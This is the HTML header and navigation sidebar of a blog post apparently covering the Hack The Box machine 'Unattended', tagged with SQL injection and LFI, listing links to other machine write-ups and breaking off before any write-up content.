<!doctype html><html lang=en><head><title>[HTB] Machine: Unattended</title>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel=stylesheet href=/application.1a3879fad116620fd3ded16eed8d9fc270faafadbff9abae778b8035e44d7733.css integrity="sha256-Gjh5+tEWYg/T3tFu7Y2fwnD6r62/+auud4uANeRNdzM="><link rel=icon type=image/png href=/images/logo_hu9284306510705827585.png><meta property="og:url" content="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/unattended/"><meta property="og:site_name" content="Personal Blog"><meta property="og:title" content="[HTB] Machine: Unattended"><meta property="og:description" content="[HTB] Machine: Unattended"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-25T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-25T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Sqli"><meta property="article:tag" content="Sqlmap"><meta property="article:tag" content="Nginx"><meta property="article:tag" content="Nginx-Aliases"><meta property="article:tag" content="Lfi"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HTB] Machine: Unattended"><meta name=twitter:description content="[HTB] Machine: Unattended"><meta name=description content="[HTB] Machine: Unattended"><script>theme=localStorage.getItem("darkmode:color-scheme")||"system",theme=="system"&&(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?theme="dark":theme="light"),document.documentElement.setAttribute("data-theme",theme)</script></head><body class="type-posts kind-page" data-bs-spy=scroll data-bs-target=#TableOfContents data-bs-offset=80><div class="container-fluid bg-secondary wrapper"><nav class="navbar navbar-expand-xl top-navbar shadow" id=top-navbar><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<i data-feather=sidebar></i>
</button>
<a class=navbar-brand href=/><img src=/images/logo_hu9284306510705827585.png id=logo alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#top-nav-items aria-label=menu>
<i data-feather=menu></i></button><div class="collapse navbar-collapse dynamic-navbar" id=top-nav-items><ul class="nav navbar-nav ms-auto"><li class=nav-item><a class=nav-link href=/#home>Home</a></li><li class=nav-item><a class=nav-link href=/#about>About</a></li><li class=nav-item><a class=nav-link href=/#education>Education</a></li><li class=nav-item><a class=nav-link href=/#projects>Projects</a></li><div id=top-navbar-divider></div><li class=nav-item><a class=nav-link id=blog-link href=/posts>Posts</a></li><li class=nav-item><a class=nav-link href=https://toha-guides.netlify.app/posts/>Docs</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-bs-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg class=theme-icon src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=theme-icon src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=dark><img class=theme-icon src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=system><img class=theme-icon src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hu9284306510705827585.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hu9284306510705827585.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i data-feather=minus-circle></i><a class="active list-link" href=/posts/cybersecurity/> Cybersecurity</a><ul class=active><li><i data-feather=minus-circle></i><a class="active list-link" href=/posts/cybersecurity/hackthebox/> Hackthebox</a><ul class=active><li><a class=list-link href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i data-feather=minus-circle></i><a class="active list-link" href=/posts/cybersecurity/hackthebox/machines/> [HTB] Machines</a><ul class=active><li><i data-feather=minus-circle></i><a class="active list-link" href=/posts/cybersecurity/hackthebox/machines/linux/> [HTB] Linux Machines</a><ul class=active><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/ai/ title="[HTB] Machine: AI">[HTB] Machine: AI</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/ title="[HTB] Machine: Apocalyst">[HTB] Machine: Apocalyst</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/aragog/ title="[HTB] Machine: Aragog">[HTB] Machine: Aragog</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/backend/ title="[HTB] Machine: Backend">[HTB] Machine: Backend</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/backendtwo/ title="[HTB] Machine: BackendTwo">[HTB] Machine: BackendTwo</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bitlab/ title="[HTB] Machine: Bitlab">[HTB] Machine: Bitlab</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/broscience/ title="[HTB] Machine: BroScience">[HTB] Machine: BroScience</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/bucket/ title="[HTB] Machine: Bucket">[HTB] Machine: Bucket</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/cache/ title="[HTB] Machine: Cache">[HTB] Machine: Cache</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/canape/ title="[HTB] Machine: Canape">[HTB] Machine: Canape</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/carrier/ title="[HTB] Machine: Carrier">[HTB] Machine: Carrier</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/celestial/ title="[HTB] Machine: Celestial">[HTB] Machine: Celestial</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/chaos/ title="[HTB] Machine: Chaos">[HTB] Machine: Chaos</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/craft/ title="[HTB] Machine: Craft">[HTB] Machine: Craft</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/devoops/ title="[HTB] Machine: DevOops">[HTB] Machine: DevOops</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/dynstr/ title="[HTB] Machine: Dynstr">[HTB] Machine: Dynstr</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/enterprise/ title="[HTB] Machine: Enterprise">[HTB] Machine: Enterprise</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/europa/ title="[HTB] Machine: Europa">[HTB] Machine: Europa</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/hawk/ title="[HTB] Machine: Hawk">[HTB] Machine: Hawk</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/inception/ title="[HTB] Machine: Inception">[HTB] Machine: Inception</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/jarvis/ title="[HTB] Machine: Jarvis">[HTB] Machine: Jarvis</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/magic/ title="[HTB] Machine: Magic">[HTB] Machine: Magic</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/mango/ title="[HTB] Machine: Mango">[HTB] Machine: Mango</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/mentor/ title="[HTB] Machine: Mentor">[HTB] Machine: Mentor</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/nineveh/ title="[HTB] Machine: Nineveh">[HTB] Machine: Nineveh</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/node/ title="[HTB] Machine: Node">[HTB] Machine: Node</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/obscurity/ title="[HTB] Machine: Obscurity">[HTB] Machine: Obscurity</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/olympus/ title="[HTB] Machine: Olympus">[HTB] Machine: Olympus</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/ title="[HTB] Machine: Ophiuchi">[HTB] Machine: Ophiuchi</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/passage/ title="[HTB] Machine: Passage">[HTB] Machine: Passage</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC">[HTB] Machine: PC</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/pit/ title="[HTB] Machine: Pit">[HTB] Machine: Pit</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/ready/ title="[HTB] Machine: Ready">[HTB] Machine: Ready</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/redcross/ title="[HTB] Machine: RedCross">[HTB] Machine: RedCross</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/schooled/ title="[HTB] Machine: Schooled">[HTB] Machine: Schooled</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/seal/ title="[HTB] Machine: Seal">[HTB] Machine: Seal</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/shibboleth/ title="[HTB] Machine: Shibboleth">[HTB] Machine: Shibboleth</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/ title="[HTB] Machine: SneakyMailer">[HTB] Machine: SneakyMailer</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/solidstate/ title="[HTB] Machine: SolidState">[HTB] Machine: SolidState</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/stratosphere/ title="[HTB] Machine: Stratosphere">[HTB] Machine: Stratosphere</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/ title="[HTB] Machine: TartarSauce">[HTB] Machine: TartarSauce</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/tenet/ title="[HTB] Machine: Tenet">[HTB] Machine: Tenet</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/thenotebook/ title="[HTB] Machine: TheNotebook">[HTB] Machine: TheNotebook</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/time/ title="[HTB] Machine: Time">[HTB] Machine: Time</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a class="active list-link" href=/posts/cybersecurity/hackthebox/machines/linux/unattended/ title="[HTB] Machine: Unattended">[HTB] Machine: Unattended</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union">[HTB] Machine: Union</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/updown/ title="[HTB] Machine: Updown">[HTB] Machine: Updown</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/vault/ title="[HTB] Machine: Vault">[HTB] Machine: Vault</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo">[HTB] Machine: Waldo</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/wall/ title="[HTB] Machine: Wall">[HTB] Machine: Wall</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/writer/ title="[HTB] Machine: Writer">[HTB] Machine: Writer</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/linux/ypuffy/ title="[HTB] Machine: Ypuffy">[HTB] Machine: Ypuffy</a></li></ul></li><li><i data-feather=plus-circle></i><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/> [HTB] Windows Machines</a><ul><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a class=list-link href=/posts/cybersecurity/hackthebox/machines/windows/json/ 